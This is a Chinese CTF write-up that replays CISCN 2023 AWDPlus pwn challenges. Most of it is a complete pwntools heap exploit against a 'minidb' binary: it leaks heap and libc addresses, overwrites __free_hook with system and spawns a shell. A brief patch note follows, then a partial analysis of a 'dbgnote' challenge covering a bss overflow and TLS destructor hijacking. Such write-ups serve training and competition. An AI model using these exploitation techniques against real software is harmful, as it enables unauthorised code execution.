<p>​<a href="/assets/img/2024-CTFWP-images/2023-01-24-CISCN 2023 华东北赛区 AWDPlus pwn 题复现/assets/image-20240114144517-smngdzm.png" class="popup img-link  shimmer"><img src="/assets/img/2024-CTFWP-images/2023-01-24-CISCN 2023 华东北赛区 AWDPlus pwn 题复现/assets/image-20240114144517-smngdzm.png" alt="image" loading="lazy"></a>​</p>

<p>​<a href="/assets/img/2024-CTFWP-images/2023-01-24-CISCN 2023 华东北赛区 AWDPlus pwn 题复现/assets/image-20240114144559-vqb8tsg.png" class="popup img-link  shimmer"><img src="/assets/img/2024-CTFWP-images/2023-01-24-CISCN 2023 华东北赛区 AWDPlus pwn 题复现/assets/image-20240114144559-vqb8tsg.png" alt="image" loading="lazy"></a>​</p>

<h3 id="break"><span class="me-2">Break</span><a href="#break" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>‍</p>

<div class="language-python highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
118
119
120
121
122
123
124
125
126
127
128
129
130
131
132
133
134
135
136
137
138
139
140
141
142
143
144
145
146
147
148
149
150
151
152
153
154
155
156
157
158
159
160
161
162
163
164
165
166
167
168
169
170
171
172
173
174
175
176
177
</pre></td><td class="rouge-code"><pre><span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">s</span>       <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">io</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
<span class="n">sa</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">delim</span><span class="p">,</span><span class="n">data</span>         <span class="p">:</span><span class="n">io</span><span class="p">.</span><span class="nf">sendafter</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">delim</span><span class="p">),</span> <span class="n">data</span><span class="p">)</span>
<span class="n">sl</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">io</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
<span class="n">sla</span>     <span class="o">=</span> <span class="k">lambda</span> <span class="n">delim</span><span class="p">,</span><span class="n">data</span>         <span class="p">:</span><span class="n">io</span><span class="p">.</span><span class="nf">sendlineafter</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">delim</span><span class="p">),</span> <span class="n">data</span><span class="p">)</span>
<span class="n">r</span>       <span class="o">=</span> <span class="k">lambda</span> <span class="n">num</span>                <span class="p">:</span><span class="n">io</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="n">num</span><span class="p">)</span>
<span class="n">ru</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">delims</span><span class="p">,</span> <span class="n">drop</span><span class="o">=</span><span class="bp">True</span>  <span class="p">:</span><span class="n">io</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="n">delims</span><span class="p">,</span> <span class="n">drop</span><span class="p">)</span>
<span class="n">itr</span>     <span class="o">=</span> <span class="k">lambda</span>                    <span class="p">:</span><span class="n">io</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>
<span class="n">uu32</span>    <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="nf">u32</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="nf">ljust</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span><span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">))</span>
<span class="n">uu64</span>    <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="nf">u64</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="nf">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">))</span>
<span class="n">ls</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">log</span><span class="p">.</span><span class="nf">success</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
<span class="n">lss</span>     <span class="o">=</span> <span class="k">lambda</span> <span class="n">s</span>                  <span class="p">:</span><span class="n">log</span><span class="p">.</span><span class="nf">success</span><span class="p">(</span><span class="sh">'</span><span class="se">\033</span><span class="s">[1;31;40m%s --&gt; 0x%x </span><span class="se">\033</span><span class="s">[0m</span><span class="sh">'</span> <span class="o">%</span> <span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="nf">eval</span><span class="p">(</span><span class="n">s</span><span class="p">)))</span>

<span class="n">context</span><span class="p">.</span><span class="n">arch</span>      <span class="o">=</span> <span class="sh">'</span><span class="s">amd64</span><span class="sh">'</span>
<span class="n">context</span><span class="p">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="sh">'</span><span class="s">debug</span><span class="sh">'</span>
<span class="n">context</span><span class="p">.</span><span class="n">terminal</span>  <span class="o">=</span> <span class="p">[</span><span class="sh">'</span><span class="s">tmux</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">splitw</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">-h</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">-l</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">130</span><span class="sh">'</span><span class="p">]</span>
<span class="k">def</span> <span class="nf">start</span><span class="p">(</span><span class="n">binary</span><span class="p">,</span><span class="n">argv</span><span class="o">=</span><span class="p">[],</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">):</span>
    <span class="sh">'''</span><span class="s">Start the exploit against the target.</span><span class="sh">'''</span>
    <span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">GDB</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">gdb</span><span class="p">.</span><span class="nf">debug</span><span class="p">([</span><span class="n">binary</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="n">gdbscript</span><span class="o">=</span><span class="n">gdbscript</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
    <span class="k">elif</span> <span class="n">args</span><span class="p">.</span><span class="n">RE</span><span class="p">:</span>
        <span class="k">return</span> <span class="nf">remote</span><span class="p">()</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">return</span> <span class="nf">process</span><span class="p">([</span><span class="n">binary</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>


<span class="n">binary</span> <span class="o">=</span> <span class="sh">'</span><span class="s">minidb</span><span class="sh">'</span>
<span class="n">libelf</span> <span class="o">=</span> <span class="sh">''</span>

<span class="nf">if </span><span class="p">(</span><span class="n">binary</span><span class="o">!=</span><span class="sh">''</span><span class="p">):</span> <span class="n">elf</span>  <span class="o">=</span> <span class="nc">ELF</span><span class="p">(</span><span class="n">binary</span><span class="p">)</span> <span class="p">;</span> <span class="n">rop</span><span class="o">=</span><span class="nc">ROP</span><span class="p">(</span><span class="n">binary</span><span class="p">);</span><span class="n">libc</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">libc</span>
<span class="nf">if </span><span class="p">(</span><span class="n">libelf</span><span class="o">!=</span><span class="sh">''</span><span class="p">):</span> <span class="n">libc</span> <span class="o">=</span> <span class="nc">ELF</span><span class="p">(</span><span class="n">libelf</span><span class="p">)</span>

<span class="n">gdbscript</span> <span class="o">=</span> <span class="sh">'''</span><span class="s">
continue
</span><span class="sh">'''</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="o">**</span><span class="nf">locals</span><span class="p">())</span>

<span class="n">io</span> <span class="o">=</span> <span class="nf">start</span><span class="p">(</span><span class="n">binary</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">add_db</span><span class="p">(</span><span class="n">name</span><span class="p">,</span><span class="n">Type</span><span class="p">):</span>
    <span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">Your choice: </span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">sl</span><span class="p">(</span><span class="sh">'</span><span class="s">1</span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">Please input the name of database: </span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">sl</span><span class="p">(</span><span class="n">name</span><span class="p">)</span>
    <span class="nf">ru</span><span class="p">(</span><span class="sh">"</span><span class="s">Please input the type of database: </span><span class="sh">"</span><span class="p">)</span>
    <span class="nf">sl</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">Type</span><span class="p">))</span>
<span class="k">def</span> <span class="nf">use_db</span><span class="p">(</span><span class="n">name</span><span class="p">):</span>
    <span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">Your choice: </span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">sl</span><span class="p">(</span><span class="sh">'</span><span class="s">2</span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">ru</span><span class="p">(</span><span class="sh">"</span><span class="s">Please input the name of database: </span><span class="sh">"</span><span class="p">)</span>
    <span class="nf">sl</span><span class="p">(</span><span class="n">name</span><span class="p">)</span>
<span class="k">def</span> <span class="nf">del_db</span><span class="p">(</span><span class="n">name</span><span class="p">):</span>
    <span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">Your choice: </span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">sl</span><span class="p">(</span><span class="sh">'</span><span class="s">3</span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">Please input the name of database: </span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">sl</span><span class="p">(</span><span class="n">name</span><span class="p">)</span>
<span class="k">def</span> <span class="nf">show_db</span><span class="p">():</span>
    <span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">Your choice: </span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">sl</span><span class="p">(</span><span class="sh">'</span><span class="s">4</span><span class="sh">'</span><span class="p">)</span>
<span class="k">def</span> <span class="nf">rename_db</span><span class="p">(</span><span class="n">name</span><span class="p">,</span><span class="n">new_name</span><span class="p">):</span>
    <span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">Your choice: </span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">sl</span><span class="p">(</span><span class="sh">'</span><span class="s">5</span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">ru</span><span class="p">(</span><span class="sh">"</span><span class="s">Please input the name of database: </span><span class="sh">"</span><span class="p">)</span>
    <span class="nf">sl</span><span class="p">(</span><span class="n">name</span><span class="p">)</span>
    <span class="nf">ru</span><span class="p">(</span><span class="sh">"</span><span class="s">Please input the new name for database: </span><span class="sh">"</span><span class="p">)</span>
    <span class="nf">sl</span><span class="p">(</span><span class="n">new_name</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">use_db_add</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span><span class="n">data</span><span class="p">):</span>
    <span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">Your choice: </span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">sl</span><span class="p">(</span><span class="sh">'</span><span class="s">1</span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">Input the key: </span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">sl</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
    <span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">Input the value:</span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">sl</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
<span class="k">def</span> <span class="nf">use_db_show</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
    <span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">Your choice: </span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">sl</span><span class="p">(</span><span class="sh">'</span><span class="s">2</span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">Input the key: </span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">sl</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
<span class="k">def</span> <span class="nf">use_db_edit</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span><span class="n">data</span><span class="p">):</span>
    <span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">Your choice: </span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">sl</span><span class="p">(</span><span class="sh">'</span><span class="s">3</span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">Input the key: </span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">sl</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
    <span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">Input the new value: </span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">sl</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
<span class="k">def</span> <span class="nf">use_db_rm</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
    <span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">Your choice: </span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">sl</span><span class="p">(</span><span class="sh">'</span><span class="s">4</span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">Input the key: </span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">sl</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
<span class="k">def</span> <span class="nf">use_db_exit</span><span class="p">():</span>
    <span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">Your choice: </span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">sl</span><span class="p">(</span><span class="sh">'</span><span class="s">666</span><span class="sh">'</span><span class="p">)</span>


<span class="nf">add_db</span><span class="p">(</span><span class="sh">'</span><span class="s">N</span><span class="sh">'</span><span class="o">*</span><span class="mh">0xa7</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span>

<span class="nf">use_db</span><span class="p">(</span><span class="sh">'</span><span class="s">N</span><span class="sh">'</span><span class="o">*</span><span class="mh">0xa7</span><span class="p">)</span>
<span class="nf">use_db_add</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="sh">'</span><span class="s">A</span><span class="sh">'</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span>
<span class="nf">use_db_add</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="sh">'</span><span class="s">B</span><span class="sh">'</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span>
<span class="nf">use_db_add</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span><span class="sh">'</span><span class="s">C</span><span class="sh">'</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span>
<span class="nf">use_db_add</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span><span class="sh">'</span><span class="s">D</span><span class="sh">'</span><span class="o">*</span><span class="mh">0x78</span><span class="o">+</span><span class="sh">'</span><span class="se">\xa1</span><span class="sh">'</span><span class="p">)</span>
<span class="nf">use_db_rm</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
<span class="nf">use_db_rm</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>

<span class="nf">use_db_edit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="sh">'</span><span class="s">T</span><span class="sh">'</span><span class="o">*</span><span class="mh">0x90</span><span class="p">)</span>

<span class="nf">use_db_add</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span><span class="sh">'</span><span class="s">X</span><span class="sh">'</span><span class="p">)</span>
<span class="nf">use_db_add</span><span class="p">(</span><span class="mh">0xa1</span><span class="p">,</span><span class="sh">'</span><span class="s">Y</span><span class="sh">'</span><span class="p">)</span>
<span class="nf">use_db_rm</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
<span class="nf">use_db_rm</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
<span class="nf">use_db_edit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="sh">'</span><span class="s">T</span><span class="sh">'</span><span class="o">*</span><span class="mh">0x78</span><span class="o">+</span><span class="sh">'</span><span class="se">\xa1</span><span class="sh">'</span><span class="p">)</span>
<span class="nf">use_db_show</span><span class="p">(</span><span class="mh">0xa1</span><span class="p">)</span>
<span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s"> is </span><span class="sh">'</span><span class="p">)</span>
<span class="n">heap_addr</span> <span class="o">=</span> <span class="nf">uu64</span><span class="p">(</span><span class="nf">r</span><span class="p">(</span><span class="mi">6</span><span class="p">))</span>
<span class="nf">use_db_exit</span><span class="p">()</span>
<span class="nf">add_db</span><span class="p">(</span><span class="sh">'</span><span class="s">text1</span><span class="sh">'</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span>
<span class="nf">add_db</span><span class="p">(</span><span class="sh">'</span><span class="s">text2</span><span class="sh">'</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span>
<span class="nf">add_db</span><span class="p">(</span><span class="sh">'</span><span class="s">text3</span><span class="sh">'</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span>
<span class="nf">add_db</span><span class="p">(</span><span class="sh">'</span><span class="s">/bin/sh</span><span class="sh">'</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span>
<span class="nf">del_db</span><span class="p">(</span><span class="sh">'</span><span class="s">text2</span><span class="sh">'</span><span class="p">)</span>

<span class="n">target</span> <span class="o">=</span> <span class="n">heap_addr</span> <span class="o">+</span> <span class="mi">144</span>
<span class="n">target1</span> <span class="o">=</span> <span class="n">heap_addr</span> <span class="o">+</span> <span class="mi">2272</span>

<span class="nf">use_db</span><span class="p">(</span><span class="sh">'</span><span class="s">N</span><span class="sh">'</span><span class="o">*</span><span class="mh">0xa7</span><span class="p">)</span>
<span class="nf">use_db_edit</span><span class="p">(</span><span class="mh">0xa1</span><span class="p">,</span><span class="nf">p64</span><span class="p">(</span><span class="n">target</span><span class="p">))</span>
<span class="c1">#
#
</span><span class="nf">use_db_add</span><span class="p">(</span><span class="mi">10</span><span class="p">,</span><span class="sh">'</span><span class="s">test1</span><span class="sh">'</span><span class="p">)</span>
<span class="nf">use_db_add</span><span class="p">(</span><span class="mh">0x21</span><span class="p">,</span><span class="sa">b</span><span class="sh">'</span><span class="s">A</span><span class="sh">'</span><span class="o">*</span><span class="mi">8</span><span class="o">+</span><span class="nf">p64</span><span class="p">(</span><span class="n">target1</span><span class="p">))</span> <span class="c1"># leak main_arena
</span>
<span class="nf">use_db_exit</span><span class="p">()</span>
<span class="nf">show_db</span><span class="p">()</span>
<span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">N</span><span class="se">\n\x09</span><span class="sh">'</span><span class="p">)</span>
<span class="n">main_arena</span> <span class="o">=</span> <span class="nf">uu64</span><span class="p">(</span><span class="nf">r</span><span class="p">(</span><span class="mi">6</span><span class="p">))</span>
<span class="n">libc_base</span> <span class="o">=</span> <span class="n">main_arena</span> <span class="o">-</span> <span class="mi">2018272</span>
<span class="n">libc</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">libc</span>
<span class="n">__free_hook</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="sh">'</span><span class="s">__free_hook</span><span class="sh">'</span><span class="p">]</span>
<span class="n">system</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="sh">'</span><span class="s">system</span><span class="sh">'</span><span class="p">]</span>
<span class="nf">use_db</span><span class="p">(</span><span class="sh">'</span><span class="s">N</span><span class="sh">'</span><span class="o">*</span><span class="mh">0xa7</span><span class="p">)</span>
<span class="nf">use_db_edit</span><span class="p">(</span><span class="mh">0x21</span><span class="p">,</span><span class="sa">b</span><span class="sh">'</span><span class="s">A</span><span class="sh">'</span> <span class="o">*</span><span class="mh">0x18</span><span class="o">+</span> <span class="nf">p16</span><span class="p">(</span><span class="mh">0x801</span><span class="p">))</span>
<span class="nf">use_db_edit</span><span class="p">(</span><span class="mh">0x21</span><span class="p">,</span><span class="sa">b</span><span class="sh">'</span><span class="s">A</span><span class="sh">'</span> <span class="o">*</span><span class="mi">9</span><span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">target1</span><span class="p">))</span>
<span class="nf">use_db_edit</span><span class="p">(</span><span class="mh">0x21</span><span class="p">,</span><span class="sa">b</span><span class="sh">'</span><span class="s">A</span><span class="sh">'</span> <span class="o">*</span><span class="mi">8</span><span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">target1</span><span class="p">))</span>
<span class="nf">use_db_exit</span><span class="p">()</span>

<span class="nf">use_db</span><span class="p">(</span><span class="sh">'</span><span class="s">/bin/sh</span><span class="sh">'</span><span class="p">)</span>
<span class="nf">use_db_add</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="sh">'</span><span class="s">A</span><span class="sh">'</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span>
<span class="nf">use_db_add</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="sh">'</span><span class="s">B</span><span class="sh">'</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span>
<span class="nf">use_db_add</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span><span class="sh">'</span><span class="s">C</span><span class="sh">'</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span>
<span class="nf">use_db_add</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span><span class="sh">'</span><span class="s">D</span><span class="sh">'</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span>

<span class="nf">use_db_rm</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
<span class="nf">use_db_rm</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
<span class="nf">use_db_edit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="sh">'</span><span class="s">T</span><span class="sh">'</span><span class="o">*</span><span class="mh">0x90</span><span class="p">)</span>

<span class="nf">use_db_add</span><span class="p">(</span><span class="mi">10</span><span class="p">,</span><span class="sh">'</span><span class="s">D</span><span class="sh">'</span><span class="o">*</span><span class="mh">0x18</span><span class="o">+</span><span class="sh">'</span><span class="se">\xa1</span><span class="sh">'</span><span class="p">)</span>
<span class="nf">use_db_add</span><span class="p">(</span><span class="mi">11</span><span class="p">,</span><span class="sh">'</span><span class="s">D</span><span class="sh">'</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span>

<span class="nf">use_db_rm</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
<span class="nf">use_db_rm</span><span class="p">(</span><span class="mi">11</span><span class="p">)</span>
<span class="nf">use_db_edit</span><span class="p">(</span><span class="mi">10</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="s">T</span><span class="sh">'</span><span class="o">*</span><span class="mh">0x20</span><span class="o">+</span><span class="nf">p64</span><span class="p">(</span><span class="n">__free_hook</span><span class="o">-</span><span class="mh">0x10</span><span class="p">))</span>

<span class="nf">use_db_add</span><span class="p">(</span><span class="mi">21</span><span class="p">,</span><span class="sh">'</span><span class="s">tt</span><span class="sh">'</span><span class="p">)</span>
<span class="nf">use_db_add</span><span class="p">(</span><span class="mi">22</span><span class="p">,</span><span class="nf">p64</span><span class="p">(</span><span class="n">system</span><span class="p">))</span>
<span class="nf">use_db_exit</span><span class="p">()</span>


<span class="nf">lss</span><span class="p">(</span><span class="sh">'</span><span class="s">libc_base</span><span class="sh">'</span><span class="p">)</span>
<span class="nf">lss</span><span class="p">(</span><span class="sh">'</span><span class="s">heap_addr</span><span class="sh">'</span><span class="p">)</span>
<span class="c1">#gdb.attach(io,'brva 0x002340')
</span>
<span class="nf">del_db</span><span class="p">(</span><span class="sh">'</span><span class="s">/bin/sh</span><span class="sh">'</span><span class="p">)</span>


<span class="n">io</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>
</pre></td></tr></tbody></table></code></div></div>

<h3 id="fix"><span class="me-2">Fix</span><a href="#fix" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<ul>
  <li>修复应该很简单直接这个 nop 掉 应该就没问题了</li>
</ul>

<p>​<a href="/assets/img/2024-CTFWP-images/2023-01-24-CISCN 2023 华东北赛区 AWDPlus pwn 题复现/assets/image-20240114144841-185arht.png" class="popup img-link  shimmer"><img src="/assets/img/2024-CTFWP-images/2023-01-24-CISCN 2023 华东北赛区 AWDPlus pwn 题复现/assets/image-20240114144841-185arht.png" alt="image" loading="lazy"></a>​</p>

<p>‍</p>

<ul>
  <li>修复</li>
</ul>

<p>​<a href="/assets/img/2024-CTFWP-images/2023-01-24-CISCN 2023 华东北赛区 AWDPlus pwn 题复现/assets/image-20240114144922-hftyd59.png" class="popup img-link  shimmer"><img src="/assets/img/2024-CTFWP-images/2023-01-24-CISCN 2023 华东北赛区 AWDPlus pwn 题复现/assets/image-20240114144922-hftyd59.png" alt="image" loading="lazy"></a>​</p>

<p>‍</p>

<p>‍</p>

<p>‍</p>

<p>‍</p>

<p>‍</p>

<h2 id="dbgnote"><span class="me-2">dbgnote</span><a href="#dbgnote" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<ul>
  <li>envp 知识点 <code class="language-plaintext highlighter-rouge">LD_DEBUG=files</code>​ <code class="language-plaintext highlighter-rouge">LD_DEBUG=all</code>​ 环境变量里有这些，运行时会有调试信息</li>
  <li>劫持 tls 段 控制 <code class="language-plaintext highlighter-rouge">exit</code>​​ -&gt; <code class="language-plaintext highlighter-rouge">__run_exit_handlers</code>​​ -&gt; <code class="language-plaintext highlighter-rouge">__call_tls_dtors</code>​​ 里面的走向</li>
</ul>

<h3 id="程序分析-1"><span class="me-2">程序分析</span><a href="#程序分析-1" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<ul>
  <li>main 函数处 buf 存在 一个bss 上的溢出，可以覆盖 下面的指针</li>
</ul>

<p>​<a href="/assets/img/2024-CTFWP-images/2023-01-24-CISCN 2023 华东北赛区 AWDPlus pwn 题复现/assets/image-20240113110213-zfpazn7.png" class="popup img-link  shimmer"><img src="/assets/img/2024-CTFWP-images/2023-01-24-CISCN 2023 华东北赛区 AWDPlus pwn 题复现/assets/image-20240113110213-zfpazn7.png" alt="image" loading="lazy"></a>​</p>

<p>‍</p>

<ul>
  <li>四功能齐全，但是没有任何问题，此题可能不是打堆</li>
</ul>

<p>​<a href="/assets/img/2024-CTFWP-images/2023-01-24-CISCN 2023 华东北赛区 AWDPlus pwn 题复现/assets/image-20240113110401-arn4d9q.png" class="popup img-link  shimmer"><img src="/assets/img/2024-CTFWP-images/2023-01-24-CISCN 2023 华东北赛区 AWDPlus pwn 题复现/assets/image-20240113110401-arn4d9q.png" alt="image" loading="lazy"></a>​</p>

<p>‍</p>

<ul>
  <li>gift 功能 泄露栈地址，具体什么用后面就知道了</li>
</ul>

<p>​<a href="/assets/img/2024-CTFWP-images/2023-01-24-CISCN 2023 华东北赛区 AWDPlus pwn 题复现/assets/image-20240113112439-bjyfn95.png" class="popup img-link  shimmer"><img src="/assets/img/2024-CTFWP-images/2023-01-24-CISCN 2023 华东北赛区 AWDPlus pwn 题复现/assets/image-20240113112439-bjyfn95.png" alt="image" loading="lazy"></a>​</p>

<ul>
  <li>dbg 模式</li>
</ul>

<p>​<a href="/assets/img/2024-CTFWP-images/2023-01-24-CISCN 2023 华东北赛区 AWDPlus pwn 题复现/assets/image-20240113110726-psas9id.png" class="popup img-link  shimmer"><img src="/assets/img/2024-CTFWP-images/2023-01-24-CISCN 2023 华东北赛区 AWDPlus pwn 题复现/assets/image-20240113110726-psas9id.png" alt="image" loading="lazy"></a>​</p>

<p>‍</p>

<ul>
  <li>初始化函数，存在一个 可以触发 dbg 模式的 信号 6</li>
</ul>

<p>​<a href="/assets/img/2024-CTFWP-images/2023-01-24-CISCN 2023 华东北赛区 AWDPlus pwn 题复现/assets/image-20240113110753-bghsm9o.png" class="popup img-link  shimmer"><img src="/assets/img/2024-CTFWP-images/2023-01-24-CISCN 2023 华东北赛区 AWDPlus pwn 题复现/assets/image-20240113110753-bghsm9o.png" alt="image" loading="lazy"></a>​</p>

<p>‍</p>

